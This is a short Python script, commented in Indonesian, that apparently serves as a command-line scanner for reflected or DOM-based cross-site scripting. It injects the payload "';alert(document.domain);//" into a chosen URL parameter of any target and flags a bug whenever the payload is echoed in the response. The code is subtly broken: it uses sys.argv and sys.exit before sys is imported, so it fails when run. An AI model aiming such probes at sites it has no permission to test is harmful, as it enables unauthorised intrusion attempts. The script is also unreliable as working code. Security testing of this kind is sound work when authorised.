import requests
from urllib.parse import quote

def check_js_xss(url, param):
    """Mencoba DOM-based/Reflected XSS melalui manipulasi JavaScript."""
    print(f"[*] Menguji Celah JavaScript/DOM XSS pada parameter: {param}")
    
    # Payload yang lebih fokus pada eksekusi JS di sisi klien
    js_payload = "';alert(document.domain);//"
    
    # Membuat URL dengan payload
    full_url = f"{url}?{param}={quote(js_payload)}"
    
    try:
        # Menggunakan session untuk menjaga konteks jika diperlukan
        session = requests.Session()
        response = session.get(full_url, timeout=10)
        
        # Deteksi: Jika payload terlihat di source code (indikasi refleksi)
        if js_payload in response.text:
            print("=====================================================")
            print(f"[!!!] BUG DITEMUKAN: Potensi JavaScript/DOM XSS")
            print(f"    URL: {full_url}")
            print(f"    Parameter: {param}")
            print(f"    Severity: Medium")
            print("    Cara Uji: Periksa bagaimana input diproses di sisi klien (DOM).")
            print("    Lokasi: URL parameter.")
            print("=====================================================")
            return True
        else:
            print("[+] Celah JavaScript/DOM XSS tidak terdeteksi pada percobaan ini.")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Error saat request: {e}")
        return False

if __name__ == '__main__':
    # Contoh penggunaan: python tools/js_checker.py <target_url> <parameter>
    if len(sys.argv) != 3:
        print("Penggunaan: python tools/js_checker.py <target_url> <parameter_to_test>")
        sys.exit(1)
    
    import sys
    target_url = sys.argv[1]
    param = sys.argv[2]
    check_js_xss(target_url, param)